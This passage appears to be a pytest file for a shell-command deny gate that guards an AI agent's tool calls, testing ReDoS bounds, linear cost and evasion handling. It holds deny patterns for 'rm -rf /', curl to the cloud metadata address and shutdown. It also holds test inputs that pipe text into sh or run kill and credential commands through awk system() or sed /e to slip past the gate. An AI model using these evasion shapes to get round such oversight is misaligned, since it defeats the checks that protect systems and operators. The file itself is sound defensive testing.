            assert tables == 2, (
                f"_next_stop_indexes ran {tables} times for one call -- the "
                "past-the-dashes table must be built exactly once, not rebuilt "
                "per program token"
            )

        dashes = [d for _, d in results]
        assert dashes[0] >= sizes[0], (
            "the instrument is not observing the path under test -- fewer "
            "double-dash-predicate calls than tokens means the table build "
            "never consulted it"
        )
        assert dashes[1] - dashes[0] == dashes[2] - dashes[1], (
            f"_is_not_double_dash counts {dashes} are not an arithmetic "
            "progression -- the run is being re-walked per program token, which "
            "is the third-forward-walk quadratic the precompute removed"
        )

    def test_the_stop_predicates_match_the_handling(self):
        """The precomputed index and the branch taken at that index are two places
        that must agree.  Each predicate is therefore asserted to hold exactly on the
        tokens its handler knows how to process."""
        from kiro_crew import security

        for token in ("-c", "-lc", "--command"):
            assert security._is_shell_command_flag(token), token
        # `-Cc` is deliberately NOT a flag stop: widening the class made it eat
        # the stop through which a later `--command`'s payload was found.  The
        # uppercase-clustered spellings belong to the every-carrier sweep
        # (spaced) and the glued pattern (glued) instead.
        for token in ("x", "--", "bash", "", "<<<", "-Cc"):
            assert not security._is_shell_command_flag(token), token

        for token in ("<<<", "<<<glued"):
            assert security._is_herestring_token(token), token
        for token in ("x", "--", "bash", "", "-c"):
            assert not security._is_herestring_token(token), token

        for token in ("-cx.sh", "-ecrg . /root", "-Ccrg . /root"):
            assert security._is_glued_shell_command_token(token), token
        for token in ("-c", "-lc", "-Cc", "x", "--", "bash", "", "<<<x"):
            assert not security._is_glued_shell_command_token(token), token

        # The sweep's loose carrier recognition covers what neither table does.
        assert security._shell_c_carrier_glued("-Cc") == ""
        assert security._shell_c_carrier_glued("-1c") == ""
        assert security._shell_c_carrier_glued("-1cx.sh") == "x.sh"
        assert security._shell_c_carrier_glued("--command") is None

        for token in ("-s", "--split-string", "-Sx", "--split-string=x"):
            assert security._is_env_split_flag(token), token
        for token in ("x", "-c", "--", ""):
            assert not security._is_env_split_flag(token), token

        assert not security._is_not_double_dash("--")
        for token in ("x", "-c", "", "---"):
            assert security._is_not_double_dash(token), token

    def test_the_index_table_reads_as_no_such_token_past_the_end(self):
        from kiro_crew import security

        table = security._next_stop_indexes(["a", "-c", "b"], lambda t: t == "-c")
        assert table == [1, 1, 3, 3], table
        assert security._next_stop_indexes([], lambda t: True) == [0]


class TestPolynomialBacktrackingStaysBounded:
    """The unbounded full-input path must not accept polynomial-backtracking regexes.

    Single-fragment patterns get full-input matching so
    an edition rule could not be silently capped at 2000 chars (padding bypass).
    That reasoning was about correctness and missed cost: the length cap was also
    what made POLYNOMIAL backtracking harmless. `a+a+$` is not the exponential
    shape `_redos_prone` screens, so it publishes fine, and unbounded it measures
    ~3.5s against 2,000 characters — a stall of the synchronous PreToolUse gate.
    GPT 5.6 flagged it, then flagged the grouped spelling `(a+)(a+)$` that the
    first screen still let through. Both were right.
    """

    def test_the_exponential_screen_does_not_catch_the_polynomial_family(self):
        # Why a second predicate is needed at all: the publication screen passes
        # this pattern, so nothing else stands between it and the gate.
        assert security.is_safe_user_regex("a+a+$") is True
        assert security.is_safe_user_regex("(a+)+$") is False

    @pytest.mark.parametrize(
        "pattern",
        [
            "a+a+$",
            r"\w+\d+$",
            ".*.*!",
            "[a-z]*[a-z]+;",
            "a{2,}b{2,}",
            # Grouped spellings: parentheses do not change the backtracking, so
            # treating a group as opaque let these through.
            "(a+)(a+)$",
            "(a+)a+$",
            "a+(a+)$",
            "(?:a+)(?:a+)$",
            "(ab)+(cd)+$",
            "((a+))(a+)$",
        ],
    )
    def test_polynomial_shapes_are_flagged(self, pattern):
        assert security._polynomial_backtracking_prone(pattern) is True

    @pytest.mark.parametrize("pattern", ["(a+)(a+)$", "(a+)a+$", "(?:a+)(?:a+)$"])
    def test_grouped_spellings_keep_the_bounded_engine(self, pattern):
        # The whole point: each of these measured multiple SECONDS unbounded.
        assert security._DenyMatcher(pattern)._bounded is True

    @pytest.mark.parametrize(
        "pattern",
        [
            r"rm\s+-rf\s+/",
            r"ada[^;&#>|\n]*credentials",
            r"curl.*169\.254\.169\.254",
            "a+b",
            r"(?:sudo\s+)?shutdown",
        ],
    )
    def test_ordinary_rules_are_not_flagged(self, pattern):
        # A literal between the quantified units is the common shape; flagging it
        # would cost the fast path for nearly every real rule.
        assert security._polynomial_backtracking_prone(pattern) is False

    def test_a_flagged_pattern_keeps_the_bounded_engine(self):
        matcher = security._DenyMatcher("a+a+$")
        assert matcher._bounded is True, "must not take the unbounded full-input path"

    def test_the_flagged_pattern_evaluates_fast_on_a_long_input(self):
        # The actual property under test is wall-clock: on the bounded engine a
        # 20k-character command must not stall the gate. Unbounded, this input
        # would take minutes.
        matcher = security._DenyMatcher("a+a+$")
        subject = "a" * 20000 + "!"
        start = time.perf_counter()
        matcher.match(subject)
        elapsed = time.perf_counter() - start
        # flake-ok: pre-existing 1 s wall-clock ceiling on a 20k-character input that takes minutes unbounded, moved verbatim; tracked for a de-flake pass
        assert elapsed < 1.0, f"deny evaluation took {elapsed:.1f}s — gate would stall"


class TestDataConsumerGuardIsChargedPerCommandNotPerPayload:
    """The deny walk must not be quadratic in nested payload COUNT.

    ``_data_consumer_exempt`` is called once per extracted payload, and three of
    its guards read only ``tokens`` -- a value the caller binds once, outside the
    payload loop.  One of those guards sweeps the whole argv with
    ``_SCRIPT_EXECUTES_RE``, so re-asking per payload cost N x len(tokens):
    18,000 payloads took ~209s measured, against ~2.5s once the answer is
    charged once.

    These assertions are STRUCTURAL on purpose.  A wall-clock bound would claim
    a performance budget for every other pass in the gate and would flake on a
    slower runner, so what is pinned is the bounded QUANTITY -- how many times
    the command-level answer is computed -- which is the property that keeps
    the guard linear.
    """

    @staticmethod
    def _spaced(n: int) -> str:
        """The many-payload shape: ``bash -c a0pay -c a1pay ...``."""
        return "bash" + "".join(f" -c a{i}pay" for i in range(n))

    @staticmethod
    def _count_guard_calls(monkeypatch, cmd: str) -> int:
        calls = {"n": 0}
        real = security._data_consumer_command_disqualified

        def counting(tokens):
            calls["n"] += 1
            return real(tokens)

        monkeypatch.setattr(security, "_data_consumer_command_disqualified", counting)
        security.is_denied(cmd)
        return calls["n"]

    @staticmethod
    def _count_argv_sweeps(monkeypatch, cmd: str) -> int:
        calls = {"n": 0}
        real = security._SCRIPT_EXECUTES_RE

        class Counting:
            def search(self, s):
                calls["n"] += 1
                return real.search(s)

            def __getattr__(self, name):
                return getattr(real, name)

        monkeypatch.setattr(security, "_SCRIPT_EXECUTES_RE", Counting())
        security.is_denied(cmd)
        return calls["n"]

    def test_guard_is_charged_once_however_many_payloads(self, monkeypatch):
        # The count must not scale with the payload count.  Measured: 1 at every
        # size here; re-doing the guard's work per payload would scale with n.
        counts = {n: self._count_guard_calls(monkeypatch, self._spaced(n)) for n in (30, 60, 120)}
        assert (
            counts[30] == counts[60] == counts[120]
        ), f"command-level guard is charged per payload, not per command: {counts}"
        # Belt as well as braces: a future change making it 2*N would still keep
        # the three counts EQUAL to each other only by accident, so bound it
        # against the payload count directly.
        assert counts[120] < 30, f"guard charged {counts[120]} times for 120 payloads"

    @pytest.mark.parametrize("n", [30, 60, 120])
    def test_argv_sweep_is_linear_in_the_argv_not_quadratic_in_payloads(self, monkeypatch, n):
        # ``_SCRIPT_EXECUTES_RE`` sweeps every token.  Charged once per command
        # that is O(len(tokens)); charged once per payload it would be
        # O(len(tokens) x payloads).  Measured per-payload: 1830 / 7260 /
        # 28920 sweeps at n = 30 / 60 / 120 (ratio ~3.98, quadratic).  Per
        # command: 61 / 121 / 241 (ratio ~1.99, linear).  The bound below is ~3x the argv
        # length, which the linear form clears with room and the quadratic form
        # misses by a factor of forty at n=120.
        cmd = self._spaced(n)
        argv_len = len(security.normalize_shell_command(cmd))
        sweeps = self._count_argv_sweeps(monkeypatch, cmd)
        assert sweeps <= 3 * argv_len, (
            f"argv sweep is quadratic in payload count: {sweeps} sweeps for an "
            f"argv of {argv_len} tokens ({n} payloads)"
        )

    @staticmethod
    def _count_argv_elements(monkeypatch, cmd: str) -> "tuple[int, int]":
        """(argv elements consumed, argv length) for one ``is_denied`` call.

        The argv is handed out as a list subclass whose iterator counts the
        elements taken from it, which is what separates ONE hoisted pass over
        the argv from one pass PER PAYLOAD.
        """
        counted = {"n": 0}

        class CountingList(list):
            def __iter__(self):
                for item in list.__iter__(self):
                    counted["n"] += 1
                    yield item

        real = security._shell_tokens

        def wrapped(*args, **kwargs):
            return CountingList(real(*args, **kwargs))

        monkeypatch.setattr(security, "_shell_tokens", wrapped)
        security.is_denied(cmd)
        return counted["n"], len(real(cmd))

    @pytest.mark.parametrize("n", [30, 60, 120, 240])
    def test_argv_is_walked_per_command_not_per_payload(self, monkeypatch, n):
        # The second half of the guard: recovering a payload's token positions with
        # ``[i for i, tok in enumerate(tokens) if tok == payload]`` walks the
        # whole argv once per payload.  Hoisting the guard alone leaves the walk
        # quadratic -- measured 1.37s / 4.30s / 15.56s at 4k / 8k / 16k payloads,
        # ratios 3.15 and 3.62 -- so this half is load-bearing, not tidying.
        #
        # Measured argv elements consumed, 30 / 60 / 120 / 240 payloads:
        #   both hoists      1154 /  2294 /  4574 /   9134   (ratio ~2.00, linear)
        #   position reverted 2984 /  9554 / 33494 / 124574   (ratio ~3.72, quadratic)
        # The bound below sits at 40x the argv length: the linear form uses ~19x
        # and the quadratic form ~259x at n=240.
        cmd = self._spaced(n)
        elements, argv_len = self._count_argv_elements(monkeypatch, cmd)
        assert elements <= 40 * argv_len, (
            f"argv walked per payload: {elements} elements consumed for an argv of "
            f"{argv_len} tokens ({n} payloads) -- expected O(argv), not O(argv x payloads)"
        )

    @pytest.mark.parametrize(
        "cmd",
        [
            # pipes into an evaluator -- the printed text IS the command
            f"echo {_NAME} {_TOK} | sh",
            f"echo '{_PK} -f {_NAME}' | bash",
            # substitution occupies program position -- its OUTPUT runs
            f"$(printf echo) {_NAME} {_TOK}",
            f"`printf echo` {_PK} -f {_NAME}",
            # the script text can EXECUTE rather than print
            f"awk 'system(\"{_PK} -f {_NAME}\")'",
            f"awk 'BEGIN{{print | \"{_PK} -f {_NAME}\"}}'",
            # a control operator inside the token starts a command that runs
            f"echo foo;{_PK} -f {_NAME}",
        ],
    )
    def test_every_way_the_exemption_is_refused_still_refuses(self, cmd):
        # Hoisting must not widen the exemption.  A faster deny gate that misses
        # one case is strictly worse than a slow one, so each documented refusal
        # route is pinned here alongside the cost assertions above.
        assert _denied_by(cmd) is not None

    @pytest.mark.parametrize(
        "cmd",
        [
            f"echo {_NAME} {_TOK}",
            f"printf '{_NAME} {_TOK}'",
            "awk '{print $1}' file",
            "sed 's/a/b/' file",
        ],
    )
    def test_the_ordinary_data_consumer_is_still_exempt(self, cmd):
        # The other direction: hoisting must not NARROW the exemption either, or
        # the change trades a latency fix for a false positive.
        assert _denied_by(cmd) is None

    @pytest.mark.parametrize(
        "cmd",
        [
            f"echo {_NAME} {_TOK}",
            f"echo {_NAME} {_TOK} | sh",
            f"awk 'system(\"{_PK} -f {_NAME}\")'",
            "awk '{print $1}' file",
            f"$(printf echo) {_NAME} {_TOK}",
        ],
    )
    def test_the_command_level_verdict_is_the_callers_to_supply(self, cmd):
        # ``command_disqualified`` is required, so a caller cannot reach the guards
        # without having charged them once for its own argv. Omitting it is a
        # TypeError rather than a silent per-token recomputation, which is the
        # shape that costs one whole-argv sweep per candidate token.
        tokens = security.normalize_shell_command(cmd)
        programs = security._argv_programs(tokens)
        hoisted = security._data_consumer_command_disqualified(tokens)
        with pytest.raises(TypeError):
            security._data_consumer_exempt(0, tokens[0], programs, tokens)
        for i, token in enumerate(tokens):
            # The supplied verdict governs: a disqualified command earns no
            # exemption for any token, whatever that token looks like.
            assert (
                security._data_consumer_exempt(
                    i, token, programs, tokens, command_disqualified=True
                )
                is False
            ), f"token {i} ({token!r}) was exempted by a disqualified command"
            supplied = security._data_consumer_exempt(
                i, token, programs, tokens, command_disqualified=hoisted
            )
            assert isinstance(supplied, bool)


class TestDataConsumerGuardIsChargedPerFrameNotPerTriggerToken:
    """The self-protection floors must not be quadratic in TRIGGER-token count.

    Four floors walk one fixed argv per frame and ask ``_data_consumer_exempt``
    about each token that passes a narrow trigger predicate: the self-program and
    self-module names (credential mint), a kill-family program name (self kill), a
    resolved self-program index (self subcommand), and an ssh-family verb (ssh to
    self). The command-level half of that guard reads only ``tokens``, and one of
    its members sweeps the whole argv with ``_SCRIPT_EXECUTES_RE``, so charging it
    per trigger token costs N x len(tokens): a 24KB command carrying 1,600
    kill-family words as arguments of a data consumer took ~14s, which crosses a
    25s-class watchdog around 2,200 such words.

    A per-frame memo makes the charge one per frame. It is computed LAZILY, at the
    first trigger token, so the far more common command that reaches these floors
    and trips no trigger predicate pays nothing at all -- the property
    ``test_a_command_with_no_trigger_token_pays_nothing`` pins, and the reason a
    memo is preferable to an unconditional per-frame hoist.

    The assertions are STRUCTURAL, matching the payload-axis class above: a
    wall-clock ratio cannot separate this property from the runner, and a wall-clock
    bound tight enough to catch the quadratic on a slow host passes it on a fast one
    -- the 24KB repro above lands under 4s on some hosts and near 14s on others. So
    what is pinned is the bounded QUANTITY: how often the command-level answer is
    computed, and how many times the argv is swept for it.
    """

    @staticmethod
    def _triggers(n: int) -> str:
        """The many-trigger shape: kill-family words as arguments of ``echo``."""
        return "echo " + " ".join([_PK, _NAME] * n)

    @staticmethod
    def _count_guard_calls(monkeypatch, cmd: str) -> "tuple[int, str | None]":
        calls = {"n": 0}
        real = security._data_consumer_command_disqualified

        def counting(tokens):
            calls["n"] += 1
            return real(tokens)

        monkeypatch.setattr(security, "_data_consumer_command_disqualified", counting)
        verdict = security.is_denied(cmd)
        return calls["n"], verdict

    def test_guard_is_charged_the_same_however_many_trigger_tokens(self, monkeypatch):
        # Measured before the memo: 700 / 1400 / 2100 calls at n = 100 / 200 / 300
        # -- exactly 7n, one per trigger token per reaching floor. After: 7 at
        # every size, one per frame per reaching floor.
        counts = {}
        for n in (100, 200, 300):
            counts[n], verdict = self._count_guard_calls(monkeypatch, self._triggers(n))
            # The verdict has to be reached THROUGH the instrumented path, or the
            # counts are counting nothing. ``echo`` makes these words data.
            assert verdict is None, f"n={n} changed the exemption verdict: {verdict!r}"
        assert counts[100] == counts[200] == counts[300], (
            "the command-level guard is charged per trigger token, not per frame: " f"{counts}"
        )
        # Equal counts alone could hold by accident for a shape that is still a
        # multiple of the trigger count, so bound the count directly too.
        assert counts[300] < 30, f"guard charged {counts[300]} times for {300 * 2} trigger tokens"

    def test_a_command_with_no_trigger_token_pays_nothing(self, monkeypatch):
        # The memo is lazy, so the common command reaching these floors without
        # tripping a trigger predicate must not pay the sweep an unconditional
        # per-frame hoist would charge it.
        calls, verdict = self._count_guard_calls(monkeypatch, f"ls -la /var/log {_NAME}.log")
        assert verdict is None
        assert calls == 0, f"a command with no trigger token paid {calls} argv sweeps"

    @pytest.mark.parametrize(
        "cmd",
        [
            # One per trigger predicate, each reaching its floor and each exempt.
            f"echo {_PK} {_NAME}",
            f"echo {_NAME} {_TOK}",
            f"echo {_NAME} restart",
            "echo ssh localhost",
            # And cases where the exemption is REFUSED, so the memo is consulted on
            # the deny side as well.
            f"echo {_PK} {_NAME} | sh",
            f"echo {_NAME} {_TOK} | sh",
            "echo ssh localhost | sh",
            f"$(printf echo) {_NAME} {_TOK}",
            # Two frames, so the memo is built more than once in one call.
            f"echo {_PK} {_NAME}; sed 's/a/{_PK} -f {_NAME}/e' f",
            f"echo {_NAME} {_TOK}; $(printf echo) {_NAME} {_TOK}",
        ],
    )
    def test_the_memo_reaches_the_same_verdict_as_recomputing_every_call(self, monkeypatch, cmd):
        # Charging the guard once per frame may not move any verdict: it is a pure
        # function of ``tokens``, which a frame binds once. Compare the real verdict
        # against one where the memo is discarded and the answer recomputed from the
        # frame's tokens at every single call.
        #
        # BOTH namespaces are patched, and neither is redundant. Each caller binds
        # ``_data_consumer_exempt`` as its own module global via ``from
        # .shell_normalizer import ...``: the four frame loops in ``argv_floor``, and
        # the payload walk in the ``security`` package body. The facade mirrors an
        # attribute write onto ONE owning submodule -- the normalizer, for this name --
        # so a facade write alone leaves ``argv_floor`` resolving the real function and
        # instruments nothing here. Which caller a given command reaches also varies:
        # ``awk 'system(...)'`` carries its kill inside one quoted token, so no frame
        # loop sees a trigger word and only the payload walk judges it.
        #
        # ``calls`` is asserted non-zero for that reason. A wrong or incomplete patch
        # target then reads as a RED test rather than a comparison of the real
        # function against itself, which would pass whatever the memo did.
        #
        # That assertion is also why ``awk 'system(...)'`` is absent from the cases
        # above: its kill is denied by a different tier and the guard is never asked,
        # so it would trip the non-zero check while proving nothing about the memo.
        # The sibling class covers that shape under refused exemptions.
        real = _argv_floor._data_consumer_exempt
        assert security._data_consumer_exempt is real, "the two callers hold one object"
        calls = {"n": 0}

        def recomputing_every_call(index, token, programs, tokens, *, command_disqualified):
            calls["n"] += 1
            return real(
                index,
                token,
                programs,
                tokens,
                command_disqualified=security._data_consumer_command_disqualified(tokens),
            )

        with_memo = security.is_denied(cmd)
        monkeypatch.setattr(_argv_floor, "_data_consumer_exempt", recomputing_every_call)
        monkeypatch.setattr(security, "_data_consumer_exempt", recomputing_every_call)
        without_memo = security.is_denied(cmd)
        assert calls["n"] > 0, (
            "the instrument observed nothing -- the patch target is not the namespace "
            f"the frame loops resolve through, so this comparison is vacuous ({cmd!r})"
        )
        assert with_memo == without_memo, (
            f"the per-frame memo changed the verdict for {cmd!r}: "
            f"memo={with_memo!r} recomputed={without_memo!r}"
        )

    @pytest.mark.parametrize(
        "floor",
        [
            "_is_credential_mint",
            "_is_self_kill",
            "_matches_self_subcommand",
            "_is_ssh_to_self",
        ],
    )
    def test_the_memo_is_declared_inside_the_frame_loop(self, floor):
        """The memo's SCOPE is the frame, and that is asserted on the source.

        Hoisting the declaration one level further out would compute the answer
        from the first frame's tokens and reuse it for every later frame -- a
        different command-level verdict silently applied to a different argv.

        This is asserted structurally rather than behaviourally because the
        behaviour is not reachable: each floor returns as soon as a frame denies,
        so a frame whose guard answer differs from an earlier frame's is only ever
        visited when the earlier frame did not deny, and no command was found that
        both survives its first frame and disagrees with it. The scope is still the
        correct shape, so it is pinned where it is visible.
        """
        import ast
        import inspect
        import textwrap

        tree = ast.parse(textwrap.dedent(inspect.getsource(getattr(security, floor))))

        def memo_targets(node) -> "list[int]":
            found = []
            for sub in ast.walk(node):
                targets = []
                if isinstance(sub, ast.Assign):
                    targets = sub.targets
                elif isinstance(sub, ast.AnnAssign):
                    targets = [sub.target]
                for t in targets:
                    if isinstance(t, ast.Name) and t.id == "disqualified":
                        value = sub.value
                        if isinstance(value, ast.Constant) and value.value is None:
                            found.append(sub.lineno)
            return found

        frame_loops = [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.For)
            and isinstance(node.target, ast.Name)
            and node.target.id == "tokens"
        ]
        assert len(frame_loops) == 1, f"{floor} no longer has exactly one frame loop"
        loop = frame_loops[0]
        inside = [ln for stmt in loop.body for ln in memo_targets(stmt)]
        assert inside, f"{floor} declares no per-frame memo inside its frame loop"
        all_declarations = memo_targets(tree)
        assert sorted(all_declarations) == sorted(inside), (
            f"{floor} declares the memo outside its frame loop as well "
            f"(inside={sorted(inside)} all={sorted(all_declarations)}) -- an outer "
            "declaration carries one frame's command-level answer into the next"
        )

    @pytest.mark.parametrize(
        "cmd",
        [
            # A data-consumer mention beside a real invocation: the real one must
            # still be judged, whichever frame it lands in.
            f"echo {_PK} {_NAME}; sed 's/a/{_PK} -f {_NAME}/e' f",
            f"echo {_NAME} {_TOK}; $(printf echo) {_NAME} {_TOK}",
            f"echo {_PK} {_NAME}; echo {_PK} {_NAME} | sh",
            "echo ssh localhost; echo ssh localhost | sh",
        ],
    )
    def test_a_mention_beside_a_real_invocation_is_still_denied(self, cmd):
        assert (
            security.is_denied(cmd) is not None
        ), f"a real invocation beside a mention went unjudged: {cmd!r}"

    @pytest.mark.parametrize("n", [50, 100, 150])
    def test_the_argv_sweep_is_linear_in_the_argv_not_quadratic_in_triggers(self, monkeypatch, n):
        """Backstop against the cost the guard-call counts cannot see.

        Those counts pin how often the command-level guard is ASKED. This one pins
        the expensive thing inside it -- ``_SCRIPT_EXECUTES_RE`` sweeping every
        token -- so a regression that re-pays the sweep somewhere else would still
        be caught. Measured per trigger token the sweeps are 35,350 / 140,700 /
        316,050 at n = 50 / 100 / 150, which is 350x / 700x / 1050x the argv length:
        the multiplier itself grows, which is what quadratic means here. Charged per
        frame it is exactly 7x the argv length at every size. The bound below leaves
        the linear form room and the quadratic form misses it by 35x at n=50.
        """
        cmd = self._triggers(n)
        argv_len = len(security.normalize_shell_command(cmd))
        calls = {"n": 0}
        real = security._SCRIPT_EXECUTES_RE

        class Counting:
            def search(self, text):
                calls["n"] += 1
                return real.search(text)

            def __getattr__(self, name):
                return getattr(real, name)

        monkeypatch.setattr(security, "_SCRIPT_EXECUTES_RE", Counting())
        assert security.is_denied(cmd) is None
        assert calls["n"] <= 10 * argv_len, (
            f"the argv sweep is quadratic in trigger count: {calls['n']} sweeps for "
            f"an argv of {argv_len} tokens ({n * 2} trigger tokens)"
        )
